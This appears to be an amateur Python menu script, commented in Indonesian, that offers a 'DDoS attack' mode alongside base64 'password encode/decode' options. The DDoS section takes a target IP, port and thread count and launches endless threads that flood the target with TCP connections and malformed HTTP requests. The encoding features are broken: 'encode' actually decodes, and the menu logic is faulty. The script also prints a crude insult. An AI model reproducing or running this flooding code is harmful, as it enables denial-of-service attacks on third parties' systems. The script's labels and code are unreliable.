import os
import sys
import time
import socket
import threading
import requests
from bs4 import BeautifulSoup
import base64
import binascii

# warnanya masbro 
merah = "\033[31m"  # merah
MERAH = "\033[1;31m"  # MERAH ++
abang = "\033[38;5;1m"
putih = "\033[1;97m"  # putih
biru = "\033[34m"  # dark blue 
BIRU = "\033[94m"  # biru terang
hijau = "\033[32m"  # hijau
HIJAU = "\033[1;32m" # hijau ++
kuning = "\033[33m"  # kuning ++
KUNING = "\033[1;33m"  # kuning
ungu = "\033[35m"  # ungu ++
UNGU = "\033[1;35m"  # ungu ++

# berikan nilai default agar gak mbeleber
x = "\033[0m"  # default

url = "https://www.facebook.com/login.php"
p_sambut = "Welcome to script adiy"
tr = "Terimaksih telah menggunakan script adiy"
disk = ""

# taimer

def waktu(milisecond):
    while milisecond:
        # runing second
        mins, secs = divmod(milisecond, 60) # 60 mili
        timer = f"{mins:02d}:{secs:02d}" # mm:ss
        print(f"\r{timer}", end='')
        time.sleep(1) # delay 1 detik
        milisecond -= 1 # setipa loop kurangi 1 detik
        # print("\n") # biyar gak bentrok

def main():
    os.system("clear")
    # os.system("cls") # opsional tergantung update di mana

    print(f'{putih}WELLCOME BOLO DI SC ADIYZD\n')
    print(f"""
    {abang}░█████╗░██████╗░██╗██╗░░░██╗███████╗██████╗░
    {abang}██╔══██╗██╔══██╗██║╚██╗░██╔╝╚════██║██╔══██╗
    {abang}███████║██║░░██║██║░╚████╔╝░░░███╔═╝██║░░██║
    {putih}██╔══██║██║░░██║██║░░╚██╔╝░░██╔══╝░░██║░░██║
    {putih}██║░░██║██████╔╝██║░░░██║░░░███████╗██████╔╝
    {putih}╚═╝░░╚═╝╚═════╝░╚═╝░░░╚═╝░░░╚══════╝╚═════╝░  
    {x}
    """)
    print(f"{BIRU} 1. Serangan DDos")
    print(f"{BIRU} 2. Amankan password akun")
    print(f"{BIRU} 3. Dekode password")
    print(f"{BIRU} 4. Dekode dokumen")
    print(f"{BIRU} 5. Encode ")
    print(f"{abang} 00. OUT!")

    # interaksi user 1
    print(f"{KUNING} WARNING {x} {putih}Pastikan pilihan anda benar!{x}")
    i_user_1 = input(f"{putih} Masukan pilihan anda dengan benar : {x}")

    #=================> bagian DDOS ATTACK <=================#
    if i_user_1 == "1":
        time.sleep(00.03)
        os.system("clear")
        print(f"{putih} Silahkan masukan Domain dan port yang dituju")
        print(f"{KUNING} Pastikan Pengetesan di lakukan dengan ijin! {putih}(ADIYDDOS){x}")
        print(f"{putih}GASSS <=|==========> {x}")

        # DDOS
        url = str(input("Masukan IP Target: "))
        Port = int(input("Masukan port: "))
        trd = int(input("Masukan waktu serangan: "))
        anonimous = str(input("Masukan face Ip: "))

        def gas():
            while True:
                try:
                    sok = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sok.connect((url, Port))
                    sok.sendto(("GET /" + url + "HTTP/1.1\r\n").encode('ascii'), (url, Port))
                    sok.sendto(("Host: " + anonimous + "\r\n\r\n").encode('ascii'), (url, Port))
                except Exception as t:
                    print(f"Error condition: {t}")
                    # mengulang
                    time.sleep(10) # waktu 10 detik 
                    print(f"{putih} Terminal akan siap dalam waktu 10 detik{x}")
                    os.system("clear")
                    main()
                
        for j in range(trd):
            tr = threading.Thread(target=gas)
            tr.start()
            # clouse ddos

    #=================> bagian encode <=================#
    elif i_user_1 == "2":
        print(f"{KUNING} Warning : {x} {putih} Password bersifat privasi jadi ingat dengan benar!")
        print(f"{putih} Silahkan masukan password yang ingin anda encode {x}")
        print(f"{KUNING} Harus bersifat string{x}")

        user_encode = input(f"{putih} Silahkan masukan text yang ingin anda encode : {x}")
        print(f"{putih} Proses encode : ")
        # print(f"{waktu(10)}")

        # gass encode 

        e_di = base64.b64decode(user_encode.encode('utf-8'))
        di_encode = e_di.decode('utf-8')

        print(f"{HIJAU} Password berhasil di encode : {x} \n ", di_encode)

    #=================> bagian Dicode <=================# 
    if i_user_1 == "3":
        print(f"{KUNING} Warning : {x} {putih} Hasil encode yang di berikan harus benar dan tanpa ketinggalan 1 huruf")
        print(f"{putih} Silahkan masukan password yang ingin anda decode {x}")
        print(f"{KUNING} Harus bersifat string{x}")

        decode = str(input(f"{putih} Masukan hasil Encode anda: "))

        try:
            di_decode = base64.b64decode(decode, validate=True)

            try:
                decode_str = di_decode.decode('utf-8') # memeriksa utf-8
                print(f"{HIJAU} Password berhasil di decode: {x}{putih}", decode_str)
                print(f"{putih} Pilih salah satu jika ingin lanjut (y/n){x}")
                i_user_2 = input(f"{putih} Masukan pilihan anda: ")

                if i_user_2.lower == "y":
                    os.system("clear")
                    print(f"{putih} proses clear terminal {x} \r{waktu(10)}detik")
                    os.system("clear")
                    print(f"{UNGU} Good luck!!")
                    time.sleep(3) # jeda 3 detik
                    main()
                else:
                    os.system("clear")
                    print(f"{abang} Dua tia tutup botol{x}")
                    time.sleep(5)
                    # kondisi 2
                    os.system("clear")
                    print(f"{putih} Muka lu kek kontol")
                    time.sleep(8) # kasih kisaran waktu 8 sec
                    os.system("clear")

            except UnicodeTranslateError:
                print(f"{abang} Data yang ingin di encode salah! atau data bersifat number")
                with open("encode_adi_ganteng.bin", "wb") as file:
                    file.write(di_decode)
                print(f"{putih} Data bin telah di simpan sebagai encode_adi_ganteng.bin")
                print(f"{putih} System akan kembali dalam waktu {waktu(10)}sec")
                main()
        except binascii.Error:
            print(f"{abang} [!]{x}{putih} Wrong input{x}")
        except Exception as j:
            print(f"Error: {j}")
            time.sleep(5)
            main()
    #=================> bagian Encode-file <=================# 
    if i_user_1 == "4":
        print(f"{putih} Welcome to adiy script encode")
        print(f"{KUNING}[!] WARNING {x} {putih}Dilarang keras encode script orang{x}")
        print(f"{putih} Pastikan script sudah berada di folder {kuning}'encode'{x}")
        
        f_encode = str(input(f"{putih} Masukan nama file yang mau di encode: "))



    

    else:
        os.system("clear")
        print(f"{abang} Pilihan tidak ada / tidak valid !{x}")
        print(f"{time.sleep(3)}{main()}")
    


if __name__ == "__main__":
    main()